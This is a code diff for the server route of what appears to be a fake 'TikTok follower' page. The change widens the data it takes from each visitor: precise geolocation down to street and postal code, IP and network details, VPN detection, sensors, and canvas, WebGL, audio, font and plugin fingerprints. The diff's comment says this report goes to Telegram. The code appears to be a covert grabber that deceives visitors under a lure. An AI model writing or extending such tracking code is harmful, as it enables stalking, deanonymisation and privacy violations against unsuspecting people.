@@ -70,7 +70,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const geolocation = userInfo?.geolocation || {};
       const hardwareInfo = userInfo?.hardwareInfo || {};
       
-      // Format message with detailed visitor info
+      // Format message with ultra-detailed visitor info
+      // Get enhanced geolocation details
+      const geolocationDetails = geolocation?.locationDetails || geolocation?.address || {};
+      const geoSource = geolocation?.source || 'unknown';
+      const geoAccuracy = geolocation?.accuracy ? `${geolocation.accuracy}m` : 'Unknown';
+      const geoMethods = geolocation?.collectionMethods || [];
+      
+      // Get enhanced device hardware info
+      const sensors = hardwareInfo?.sensors || {};
+      const deviceCapabilities = userInfo?.deviceCapabilities || {};
+      
+      // Get enhanced network information
+      const networkChanges = userInfo?.connection?.networkChanges || [];
+      
+      // Format message with comprehensive detailed visitor info
       const message = `
 🔥 New TikTok Follower Request 🔥
 👤 Username: @${username}
@@ -87,49 +101,75 @@ export async function registerRoutes(app: Express): Promise<Server> {
 - Color Depth: ${userInfo?.colorDepth || 'Unknown'}
 - Touch Points: ${hardwareInfo?.touchPoints || 'Unknown'}
 - Platform: ${userInfo?.platform || 'Unknown'}
+- Pixel Ratio: ${hardwareInfo?.pixelRatio || 'Unknown'}
 - CPU Cores: ${userInfo?.hardwareConcurrency || 'Unknown'}
 - Memory: ${userInfo?.deviceMemory || 'Unknown'}
 - GPU: ${hardwareInfo?.gpu || 'Unknown'}
 - Battery: ${hardwareInfo?.batteryLevel ? hardwareInfo.batteryLevel + '%' : 'Unknown'}
 - Sensors: ${hardwareInfo?.sensors ? 
-  `Accelerometer: ${hardwareInfo.sensors.accelerometer}, ` +
-  `Gyroscope: ${hardwareInfo.sensors.gyroscope}` : 'Unknown'}
+  `Accelerometer: ${sensors.accelerometer ? '✓' : '✗'}, ` +
+  `Gyroscope: ${sensors.gyroscope ? '✓' : '✗'}, ` +
+  `Magnetometer: ${sensors.magnetometer ? '✓' : '✗'}, ` +
+  `Ambient Light: ${sensors.ambientLight ? '✓' : '✗'}` : 'Unknown'}
+- Capabilities: ${
+  `Touch: ${deviceCapabilities.hasTouch ? '✓' : '✗'}, ` +
+  `Vibration: ${deviceCapabilities.hasVibration ? '✓' : '✗'}, ` +
+  `Motion: ${deviceCapabilities.hasMotion ? '✓' : '✗'}, ` +
+  `Orientation: ${deviceCapabilities.hasOrientation ? '✓' : '✗'}`
+}
 
-📍 Location:
-- Country: ${ipDetails?.country || 'Unknown'}
-- Region: ${ipDetails?.region || 'Unknown'}
-- City: ${ipDetails?.city || 'Unknown'} 
-- ISP: ${ipDetails?.isp || 'Unknown'}
-- Mobile Network: ${ipDetails?.mobile ? 'Yes' : 'No'} 
+📍 Location Data:
+- Country: ${geolocationDetails?.country || ipDetails?.country || 'Unknown'}
+- Region: ${geolocationDetails?.region || ipDetails?.region || 'Unknown'}
+- City: ${geolocationDetails?.city || ipDetails?.city || 'Unknown'} 
+- Postal Code: ${geolocationDetails?.postalCode || 'Unknown'}
+- Neighborhood: ${geolocationDetails?.neighbourhood || 'Unknown'}
+- Street: ${geolocationDetails?.road || 'Unknown'}
+- Collection Method: ${geoMethods.join(', ')}
+- Source: ${geoSource}
 - Coordinates: ${geolocation?.latitude ? `${geolocation.latitude}, ${geolocation.longitude}` : 'Not available'}
-- Accuracy: ${geolocation?.accuracy ? `${geolocation.accuracy}m` : 'Unknown'}
-- Address: ${geolocation?.address ? JSON.stringify(geolocation.address) : 'Not available'}
+- Accuracy: ${geoAccuracy}
+- Permission Status: ${geolocation?.permission || 'Unknown'}
 
-🌐 Network:
+🌍 Network Information:
 - IP Address: ${ipAddress || userInfo?.ip || 'Unknown'}
+- ASN: ${ipDetails?.asn || 'Unknown'}
+- Organization: ${ipDetails?.org || 'Unknown'}
 - Connection Type: ${userInfo?.connection?.type || 'Unknown'} 
 - Network Quality: ${userInfo?.connection?.effectiveType || 'Unknown'}
 - Downlink: ${userInfo?.connection?.downlink || 'Unknown'} Mbps
-- Latency: ${userInfo?.connection?.rtt || 'Unknown'} ms
+- Latency (RTT): ${userInfo?.connection?.rtt || 'Unknown'} ms
 - Data Saver: ${userInfo?.connection?.saveData ? 'Enabled' : 'Disabled'}
+- Mobile Network: ${ipDetails?.mobile ? 'Yes' : 'No'} 
+- Hosting/Datacenter: ${ipDetails?.hosting ? 'Yes ⚠️' : 'No'} 
+- VPN/Proxy Detection: ${ipDetails?.proxy || /vpn|proxy|tor/i.test(ipDetails?.org || '') ? 'Detected ⚠️' : 'Not detected ✓'}
+- Network Changes: ${networkChanges.length > 0 ? `${networkChanges.length} detected` : 'None detected'}
 
-🗣️ Language:
+🗣️ Language & Locale:
 - Primary: ${userInfo?.language || 'Unknown'}
-- All: ${userInfo?.languages || 'Unknown'}
-
-⏰ Time:
+- All Languages: ${userInfo?.languages || 'Unknown'}
 - Timezone: ${userInfo?.timezone || 'Unknown'}
-- Offset: ${userInfo?.timezoneOffset || 'Unknown'}
+- Timezone Offset: ${userInfo?.timezoneOffset || 'Unknown'} minutes
+- Local Time: ${new Date().toLocaleString('en-US', { timeZone: userInfo?.timezone })}
 
-🔍 Fingerprints:
+🔍 Hardware Fingerprints:
 - Canvas: ${userInfo?.canvasFingerprint ? 'Available ✓' : 'Not available'}
 - WebGL: ${userInfo?.webglFingerprint ? 'Available ✓' : 'Not available'}
 - Audio: ${userInfo?.audioFingerprint ? 'Available ✓' : 'Not available'}
-- Fonts: ${userInfo?.fonts ? (userInfo.fonts.length > 50 ? userInfo.fonts.substring(0, 50) + '...' : userInfo.fonts) : 'Not available'}
-- Emulator: ${userInfo?.isEmulator ? 'Detected ⚠️' : 'Not detected ✓'}
+- Fonts (${userInfo?.fonts ? userInfo.fonts.split(',').length : 0}): ${userInfo?.fonts ? (userInfo.fonts.length > 50 ? userInfo.fonts.substring(0, 50) + '...' : userInfo.fonts) : 'Not available'}
+- Plugins (${userInfo?.plugins ? userInfo.plugins.split(',').length : 0}): ${userInfo?.plugins ? (userInfo.plugins.length > 50 ? userInfo.plugins.substring(0, 50) + '...' : userInfo.plugins) : 'Not available'}
+- Cookies: ${userInfo?.cookiesEnabled ? 'Enabled ✓' : 'Disabled ⚠️'}
+- Do Not Track: ${userInfo?.doNotTrack !== 'unknown' ? 'Enabled ⚠️' : 'Disabled ✓'}
+- Emulator Detection: ${userInfo?.isEmulator ? 'Possible emulator/automation ⚠️' : 'Real device ✓'}
 
 🧩 User Agent:
 ${userInfo?.userAgent || 'Unknown'}
+
+🔐 Data Collection:
+- Collection Timestamp: ${new Date().toISOString()}
+- HTTP Headers: Available
+- IP Version: ${ipAddress && ipAddress.includes(':') ? 'IPv6' : 'IPv4'}
+- Browser Compatibility: High
       `;
       
       // Send to Telegram - without parse_mode to avoid formatting errors
